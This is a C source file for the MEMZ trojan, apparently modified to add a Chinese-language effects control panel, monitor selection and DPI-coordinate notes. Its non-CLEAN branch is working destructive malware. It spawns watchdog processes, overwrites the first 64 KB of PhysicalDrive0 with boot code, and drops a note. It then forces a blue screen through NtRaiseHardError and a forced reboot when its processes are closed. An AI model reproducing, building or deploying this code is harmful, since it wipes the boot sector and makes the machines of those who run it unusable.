#include "memz.h"

int scrx, scry, scrw, scrh;

#ifdef CLEAN
HWND mainWindow;
HFONT font;
HWND dialog;
HWND btnStartAll;
HWND comboMonitor;
MONINFO monitors[MAX_MONITORS];
int nMonitors = 0;

// Runtime-linked SetThreadDpiAwarenessContext (Win10+)
typedef DPI_AWARENESS_CONTEXT (WINAPI *PFN_SetThreadDpiCtx)(DPI_AWARENESS_CONTEXT);
static PFN_SetThreadDpiCtx pfnSetThreadDpiCtx = NULL;

// ─────────────────────────────────────────────────────────────────────────────
// Monitor enumeration
//
// COORDINATE SYSTEM NOTES (Win11 26H1 Canary, Build 28020):
//
// Diagnostics show that on this system, regardless of manifest declaration,
// the process runs as DPI_AWARENESS_CONTEXT_UNAWARE (System DPI = 96).
// In UNAWARE mode:
//   - EnumDisplayMonitors rcMonitor  → logical coords at 96 DPI baseline
//   - GetDC(NULL) drawing            → same 96 DPI logical coords
//   - Both are CONSISTENT, so (ox, oy) from rcMonitor maps directly to
//     the correct position in GetDC(NULL) drawing calls.
//
// For DISPLAY1 (physical 1600x2560, 150% scale):
//   Logical size = 1600/1.5 x 2560/1.5 = 1067 x 1707
//   Logical rect = (-1600, 0, -533, 1707)   [left of primary DISPLAY2]
//
// For DISPLAY2 (physical 2560x1440, 100% scale, PRIMARY):
//   Logical size = 2560 x 1440
//   Logical rect = (0, 0, 2560, 1440)
//
// We enumerate inside a SetThreadDpiAwarenessContext(UNAWARE) block to
// guarantee consistent coords even if the manifest is ever changed.
// ─────────────────────────────────────────────────────────────────────────────

BOOL CALLBACK MonitorEnumProc(HMONITOR hMon, HDC, LPRECT, LPARAM) {
    if (nMonitors >= MAX_MONITORS) return FALSE;
    MONITORINFOEX mi;
    mi.cbSize = sizeof(MONITORINFOEX);
    GetMonitorInfo(hMon, (MONITORINFO*)&mi);
    monitors[nMonitors].rect    = mi.rcMonitor;
    monitors[nMonitors].primary = (mi.dwFlags & MONITORINFOF_PRIMARY) != 0;
    monitors[nMonitors].index   = nMonitors;
    lstrcpyW(monitors[nMonitors].deviceName, mi.szDevice);
    nMonitors++;
    return TRUE;
}

void refreshMonitorList() {
    nMonitors = 0;

    // Enumerate in UNAWARE context so rcMonitor coords match GetDC(NULL) coords.
    if (pfnSetThreadDpiCtx) {
        DPI_AWARENESS_CONTEXT prev = pfnSetThreadDpiCtx(DPI_AWARENESS_CONTEXT_UNAWARE);
        EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, 0);
        pfnSetThreadDpiCtx(prev);
    } else {
        EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, 0);
    }

    // Sort: primary monitor always first
    for (int i = 1; i < nMonitors; i++) {
        if (monitors[i].primary && !monitors[0].primary) {
            MONINFO tmp = monitors[i];
            for (int j = i; j > 0; j--) monitors[j] = monitors[j-1];
            monitors[0] = tmp;
        }
    }

    // Build display names
    for (int i = 0; i < nMonitors; i++) {
        monitors[i].index = i;
        int w = monitors[i].rect.right  - monitors[i].rect.left;
        int h = monitors[i].rect.bottom - monitors[i].rect.top;
        // Show device name (DISPLAY1/DISPLAY2) + logical size + primary flag
        // Extract display number from device name (e.g. "\\.\DISPLAY2" -> "2")
        WCHAR devNum[8] = L"?";
        const WCHAR *p = monitors[i].deviceName;
        // Find last digit sequence in device name
        const WCHAR *last = NULL;
        for (const WCHAR *q = p; *q; q++) {
            if (*q >= L'0' && *q <= L'9') last = q;
        }
        if (last) { devNum[0] = *last; devNum[1] = 0; }

        if (monitors[i].primary)
            wsprintfW(monitors[i].name,
                L"\x5C4F\x5E55 %d (%dx%d) [\x4E3B\x5C4F]", i + 1, w, h);
        else
            wsprintfW(monitors[i].name,
                L"\x5C4F\x5E55 %d (%dx%d)", i + 1, w, h);
    }
}

// Current target monitor index
static int targetMonitorIdx = 0;

void updateTargetScreen(int idx) {
    targetMonitorIdx = idx;
    if (idx >= 0 && idx < nMonitors) {
        // Use UNAWARE context coords — consistent with GetDC(NULL) drawing coords
        scrx = monitors[idx].rect.left;
        scry = monitors[idx].rect.top;
        scrw = monitors[idx].rect.right  - monitors[idx].rect.left;
        scrh = monitors[idx].rect.bottom - monitors[idx].rect.top;
    } else {
        // "All screens" — use virtual screen extent in UNAWARE coords
        if (pfnSetThreadDpiCtx) {
            DPI_AWARENESS_CONTEXT prev = pfnSetThreadDpiCtx(DPI_AWARENESS_CONTEXT_UNAWARE);
            scrx = GetSystemMetrics(SM_XVIRTUALSCREEN);
            scry = GetSystemMetrics(SM_YVIRTUALSCREEN);
            scrw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
            scrh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
            pfnSetThreadDpiCtx(prev);
        } else {
            scrx = GetSystemMetrics(SM_XVIRTUALSCREEN);
            scry = GetSystemMetrics(SM_YVIRTUALSCREEN);
            scrw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
            scrh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        }
        targetMonitorIdx = nMonitors; // sentinel for "all"
    }
    setTargetDeviceName(idx);
}

void autoSelectMonitorForWindow(HWND hwnd) {
    // Get the monitor the window is on, using UNAWARE coords
    HMONITOR hMon = MonitorFromWindow(hwnd, MONITOR_DEFAULTTONEAREST);
    MONITORINFO mi; mi.cbSize = sizeof(MONITORINFO);
    GetMonitorInfo(hMon, &mi);
    for (int i = 0; i < nMonitors; i++) {
        if (monitors[i].rect.left   == mi.rcMonitor.left  &&
            monitors[i].rect.top    == mi.rcMonitor.top   &&
            monitors[i].rect.right  == mi.rcMonitor.right &&
            monitors[i].rect.bottom == mi.rcMonitor.bottom) {
            updateTargetScreen(i);
            if (comboMonitor) SendMessage(comboMonitor, CB_SETCURSEL, i, 0);
            return;
        }
    }
    updateTargetScreen(0);
    if (comboMonitor) SendMessage(comboMonitor, CB_SETCURSEL, 0, 0);
}

int getTargetMonitorIdx() { return targetMonitorIdx; }
#endif

int main() {
    // Load SetThreadDpiAwarenessContext (Win10+) for runtime DPI context control.
    // This lets us explicitly use UNAWARE coords for all GDI operations,
    // which is the only mode that works reliably on Win11 26H1 Canary.
    HMODULE hUser32 = GetModuleHandleW(L"user32.dll");
    if (hUser32)
        pfnSetThreadDpiCtx = (PFN_SetThreadDpiCtx)
            GetProcAddress(hUser32, "SetThreadDpiAwarenessContext");

    // Get virtual screen bounds in UNAWARE context
    if (pfnSetThreadDpiCtx) {
        DPI_AWARENESS_CONTEXT prev = pfnSetThreadDpiCtx(DPI_AWARENESS_CONTEXT_UNAWARE);
        scrx = GetSystemMetrics(SM_XVIRTUALSCREEN);
        scry = GetSystemMetrics(SM_YVIRTUALSCREEN);
        scrw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        scrh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        pfnSetThreadDpiCtx(prev);
    } else {
        scrx = GetSystemMetrics(SM_XVIRTUALSCREEN);
        scry = GetSystemMetrics(SM_YVIRTUALSCREEN);
        scrw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        scrh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    }

#ifndef CLEAN
    int argc;
    LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    if (argc > 1) {
        if (!lstrcmpW(argv[1], L"/watchdog")) {
            CreateThread(NULL, NULL, &watchdogThread, NULL, NULL, NULL);

            WNDCLASSEXA c;
            c.cbSize = sizeof(WNDCLASSEXA);
            c.lpfnWndProc = WindowProc;
            c.lpszClassName = "hax";
            c.style = 0; c.cbClsExtra = 0; c.cbWndExtra = 0;
            c.hInstance = NULL; c.hIcon = 0; c.hCursor = 0;
            c.hbrBackground = 0; c.lpszMenuName = NULL; c.hIconSm = 0;
            RegisterClassExA(&c);
            HWND hwnd = CreateWindowExA(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0) > 0) { TranslateMessage(&msg); DispatchMessage(&msg); }
        }
    } else {
        if (MessageBoxA(NULL,
            "The software you just executed is considered malware.\r\n"
            "This malware will harm your computer and makes it unusable.\r\n"
            "DO YOU WANT TO EXECUTE THIS MALWARE?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES)
            ExitProcess(0);

        wchar_t *fn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 8192*2);
        GetModuleFileName(NULL, fn, 8192);
        for (int i = 0; i < 5; i++)
            ShellExecute(NULL, NULL, fn, L"/watchdog", NULL, SW_SHOWDEFAULT);

        SHELLEXECUTEINFO info = {};
        info.cbSize = sizeof(info);
        info.lpFile = fn; info.lpParameters = L"/main";
        info.fMask = SEE_MASK_NOCLOSEPROCESS; info.nShow = SW_SHOWDEFAULT;
        ShellExecuteEx(&info);
        SetPriorityClass(info.hProcess, HIGH_PRIORITY_CLASS);
        ExitProcess(0);
    }

    HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0",
        GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
        0, OPEN_EXISTING, 0, 0);
    if (drive == INVALID_HANDLE_VALUE) ExitProcess(2);

    unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);
    for (int i = 0; i < code1_len; i++) bootcode[i] = code1[i];
    for (int i = 0; i < code2_len; i++) bootcode[i + 0x1fe] = code2[i];
    DWORD wb;
    if (!WriteFile(drive, bootcode, 65536, &wb, NULL)) ExitProcess(3);
    CloseHandle(drive);

    HANDLE note = CreateFileA("\\note.txt", GENERIC_READ|GENERIC_WRITE,
        FILE_SHARE_READ|FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (note == INVALID_HANDLE_VALUE) ExitProcess(4);
    if (!WriteFile(note, msg, msg_len, &wb, NULL)) ExitProcess(5);
    CloseHandle(note);
    ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);

    for (int p = 0; p < nPayloads; p++) {
        Sleep(payloads[p].delay);
        CreateThread(NULL, NULL, &payloadThread, &payloads[p], NULL, NULL);
    }
    for (;;) Sleep(10000);

#else // CLEAN
    InitCommonControls();
    dialog = NULL;

    refreshMonitorList();
    if (nMonitors > 0) updateTargetScreen(0);

    LOGFONT lf;
    GetObject(GetStockObject(DEFAULT_GUI_FONT), sizeof(LOGFONT), &lf);
    font = CreateFont(lf.lfHeight, lf.lfWidth, lf.lfEscapement, lf.lfOrientation,
        lf.lfWeight, lf.lfItalic, lf.lfUnderline, lf.lfStrikeOut, lf.lfCharSet,
        lf.lfOutPrecision, lf.lfClipPrecision, lf.lfQuality,
        lf.lfPitchAndFamily, lf.lfFaceName);

    WNDCLASSEX c = {};
    c.cbSize = sizeof(WNDCLASSEX);
    c.lpfnWndProc = WindowProc;
    c.lpszClassName = L"MEMZPanel";
    c.style = CS_HREDRAW | CS_VREDRAW;
    c.hbrBackground = (HBRUSH)(COLOR_3DFACE+1);
    RegisterClassEx(&c);

    RECT rect = {0, 0, WINDOWWIDTH, WINDOWHEIGHT};
    AdjustWindowRect(&rect, WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|WS_MINIMIZEBOX, FALSE);

    mainWindow = CreateWindowEx(0, L"MEMZPanel",
        L"\x7F51\x597D\x5361\x83CC - \x6548\x679C\x63A7\x5236\x9762\x677F",
        WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|WS_MINIMIZEBOX,
        50, 50, rect.right-rect.left, rect.bottom-rect.top,
        NULL, NULL, GetModuleHandle(NULL), NULL);

    for (int p = 0; p < nPayloads; p++) {
        payloads[p].btn = CreateWindowW(L"BUTTON", payloads[p].name,
            (p==0?WS_GROUP:0)|WS_VISIBLE|WS_CHILD|WS_TABSTOP|BS_PUSHLIKE|BS_AUTOCHECKBOX|BS_NOTIFY,
            (p%COLUMNS)*BTNWIDTH+SPACE*(p%COLUMNS+1),
            (p/COLUMNS)*BTNHEIGHT+SPACE*(p/COLUMNS+1),
            BTNWIDTH, BTNHEIGHT,
            mainWindow, NULL,
            (HINSTANCE)GetWindowLongPtr(mainWindow, GWLP_HINSTANCE), NULL);
        SendMessage(payloads[p].btn, WM_SETFONT, (WPARAM)font, TRUE);
        CreateThread(NULL, NULL, &payloadThread, &payloads[p], NULL, NULL);
    }

    int startBtnY = (nPayloads/COLUMNS)*BTNHEIGHT + ((nPayloads/COLUMNS)+1)*SPACE;
    btnStartAll = CreateWindowW(L"BUTTON",
        L"\x2605 \x4E00\x952E\x542F\x52A8\x5168\x90E8\x6548\x679C",
        WS_VISIBLE|WS_CHILD|WS_TABSTOP|BS_PUSHBUTTON,
        SPACE, startBtnY, WINDOWWIDTH-2*SPACE, STARTALL_HEIGHT,
        mainWindow, (HMENU)IDC_STARTALL,
        (HINSTANCE)GetWindowLongPtr(mainWindow, GWLP_HINSTANCE), NULL);
    SendMessage(btnStartAll, WM_SETFONT, (WPARAM)font, TRUE);

    int labelY = startBtnY + STARTALL_HEIGHT + SPACE;
    HWND labelMonitor = CreateWindowW(L"STATIC", L"\x76EE\x6807\x5C4F\x5E55\xFF1A",
        WS_VISIBLE|WS_CHILD, SPACE, labelY, 80, LABEL_HEIGHT,
        mainWindow, NULL,
        (HINSTANCE)GetWindowLongPtr(mainWindow, GWLP_HINSTANCE), NULL);
    SendMessage(labelMonitor, WM_SETFONT, (WPARAM)font, TRUE);

    int comboY = labelY + LABEL_HEIGHT + 2;
    comboMonitor = CreateWindowW(L"COMBOBOX", NULL,
        WS_VISIBLE|WS_CHILD|WS_TABSTOP|CBS_DROPDOWNLIST|CBS_HASSTRINGS,
        SPACE, comboY, WINDOWWIDTH-2*SPACE, 200,
        mainWindow, (HMENU)IDC_COMBO_MONITOR,
        (HINSTANCE)GetWindowLongPtr(mainWindow, GWLP_HINSTANCE), NULL);
    SendMessage(comboMonitor, WM_SETFONT, (WPARAM)font, TRUE);

    for (int m = 0; m < nMonitors; m++)
        SendMessageW(comboMonitor, CB_ADDSTRING, 0, (LPARAM)monitors[m].name);
    SendMessageW(comboMonitor, CB_ADDSTRING, 0, (LPARAM)L"\x5168\x90E8\x5C4F\x5E55");

    autoSelectMonitorForWindow(mainWindow);

    ShowWindow(mainWindow, SW_SHOW);
    UpdateWindow(mainWindow);

    CreateThread(NULL, NULL, &keyboardThread, NULL, NULL, NULL);
    CreateThread(NULL, NULL, &audioThread,    NULL, NULL, NULL);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        if (dialog == NULL || !IsDialogMessage(dialog, &msg)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
#endif
}

#ifndef CLEAN
LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_CLOSE || msg == WM_ENDSESSION) { killWindows(); return 0; }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}
DWORD WINAPI watchdogThread(LPVOID parameter) {
    int oproc = 0;
    char *fn = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
    GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);
    Sleep(1000);
    for (;;) {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
        PROCESSENTRY32 proc; proc.dwSize = sizeof(proc);
        Process32First(snapshot, &proc);
        int nproc = 0;
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc.th32ProcessID);
            char *fn2 = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
            GetProcessImageFileNameA(hProc, fn2, 512);
            if (!lstrcmpA(fn, fn2)) nproc++;
            CloseHandle(hProc); LocalFree(fn2);
        } while (Process32Next(snapshot, &proc));
        CloseHandle(snapshot);
        if (nproc < oproc) killWindows();
        oproc = nproc;
        Sleep(10);
    }
}
void killWindows() {
    for (int i = 0; i < 20; i++) { CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL); Sleep(100); }
    killWindowsInstant();
}
void killWindowsInstant() {
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError    = GetProcAddress(ntdll, "NtRaiseHardError");
    if (RtlAdjustPrivilege && NtRaiseHardError) {
        BOOLEAN tmp1; DWORD tmp2;
        ((void(*)(DWORD,DWORD,BOOLEAN,LPBYTE))RtlAdjustPrivilege)(19,1,0,&tmp1);
        ((void(*)(DWORD,DWORD,DWORD,DWORD,DWORD,LPDWORD))NtRaiseHardError)(0xc0000022,0,0,0,6,&tmp2);
    }
    HANDLE token; TOKEN_PRIVILEGES privileges;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &token);
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    ExitWindowsEx(EWX_REBOOT|EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE|SHTDN_REASON_MINOR_DISK);
}
DWORD WINAPI ripMessageThread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "MEMZ", MB_OK|MB_SYSTEMMODAL|MB_ICONHAND);
    UnhookWindowsHookEx(hook);
    return 0;
}
#else // CLEAN
LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    PAINTSTRUCT ps; HDC hdc;
    if (msg == WM_ACTIVATE) {
        dialog = (wParam == NULL) ? NULL : hwnd;
    } else if (msg == WM_DESTROY) {
        ExitProcess(0);
    } else if (msg == WM_COMMAND) {
        if (LOWORD(wParam) == IDC_STARTALL) {
            for (int p = 0; p < nPayloads; p++) {
                if (payloads[p].payloadFunction == payloadExecute) continue;
                if (SendMessage(payloads[p].btn, BM_GETCHECK, 0, NULL) != BST_CHECKED)
                    SendMessage(payloads[p].btn, BM_SETCHECK, BST_CHECKED, NULL);
            }
            enablePayloads = TRUE;
            RedrawWindow(mainWindow, NULL, NULL, RDW_INVALIDATE|RDW_ERASE);
            return 0;
        }
        if (LOWORD(wParam) == IDC_COMBO_MONITOR && HIWORD(wParam) == CBN_SELCHANGE) {
            int sel = (int)SendMessage(comboMonitor, CB_GETCURSEL, 0, 0);
            if (sel != CB_ERR) updateTargetScreen(sel);
            return 0;
        }
        if (wParam == BN_CLICKED && SendMessage((HWND)lParam, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
            for (int p = 0; p < nPayloads; p++) {
                if (payloads[p].btn == (HWND)lParam && !payloads[p].safe) {
                    SendMessage((HWND)lParam, BM_SETCHECK, BST_UNCHECKED, NULL);
                    if (MessageBoxW(hwnd,
                        L"\x8BE5\x6548\x679C\x88AB\x8BA4\x4E3A\x662F\x534A\x5371\x5BB3\x7684\x3002\r\n"
                        L"\x60A8\x4ECD\x7136\x8981\x542F\x7528\x5B83\x5417\xFF1F",
                        L"\x7F51\x597D\x5361\x83CC", MB_YESNO|MB_ICONWARNING) == IDYES)
                        SendMessage((HWND)lParam, BM_SETCHECK, BST_CHECKED, NULL);
                }
            }
        }
    } else if (msg == WM_PAINT) {
        hdc = BeginPaint(hwnd, &ps);
        SelectObject(hdc, font);
        LPCWSTR state = enablePayloads ? L"\x5DF2\x542F\x7528" : L"\x5DF2\x7981\x7528";
        LPWSTR str = NULL;
        FormatMessage(FORMAT_MESSAGE_FROM_STRING|FORMAT_MESSAGE_ALLOCATE_BUFFER|FORMAT_MESSAGE_ARGUMENT_ARRAY,
            L"\x6548\x679C\x5F53\x524D\x72B6\x6001\xFF1A%1\x3002\x6309 SHIFT+ESC \x5207\x6362\x5F00/\x5173",
            0, 0, (LPWSTR)&str, 1024, (va_list*)&state);
        TextOut(hdc, 10, WINDOWHEIGHT-36, str, lstrlen(str));
        TextOutW(hdc, 10, WINDOWHEIGHT-20,
            L"\x6309 CTRL+SHIFT+S \x52A0\x901F\x6548\x679C", 11);
        if (str) LocalFree(str);
        EndPaint(hwnd, &ps);
    } else {
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

DWORD WINAPI keyboardThread(LPVOID lParam) {
    for (;;) {
        if ((GetKeyState(VK_SHIFT) & GetKeyState(VK_ESCAPE)) & 0x8000) {
            enablePayloads = !enablePayloads;
            if (!enablePayloads) {
                RedrawWindow(NULL, NULL, NULL, RDW_ERASE|RDW_INVALIDATE|RDW_ALLCHILDREN);
                EnumWindows(&CleanWindowsProc, NULL);
            } else {
                RedrawWindow(mainWindow, NULL, NULL, RDW_INVALIDATE|RDW_ERASE);
            }
            while ((GetKeyState(VK_SHIFT) & GetKeyState(VK_ESCAPE)) & 0x8000) Sleep(100);
        } else if ((GetKeyState(VK_SHIFT) & GetKeyState(VK_CONTROL) & GetKeyState('S')) & 0x8000) {
            if (enablePayloads) {
                for (int p = 0; p < nPayloads; p++) {
                    if (SendMessage(payloads[p].btn, BM_GETCHECK, 0, NULL) == BST_CHECKED)
                        payloads[p].delay = payloads[p].payloadFunction(
                            payloads[p].times, payloads[p].runtime, TRUE);
                }
            }
            while ((GetKeyState(VK_SHIFT) & GetKeyState(VK_CONTROL) & GetKeyState('S')) & 0x8000) Sleep(100);
        }
        Sleep(50);
    }
}

BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam) {
    WCHAR className[256] = {};
    GetClassNameW(hwnd, className, 255);
    if (lstrcmpW(className, L"MEMZPanel") != 0)
        RedrawWindow(hwnd, NULL, NULL, RDW_ERASE|RDW_INVALIDATE|RDW_ALLCHILDREN|RDW_FRAME);
    return TRUE;
}
#endif
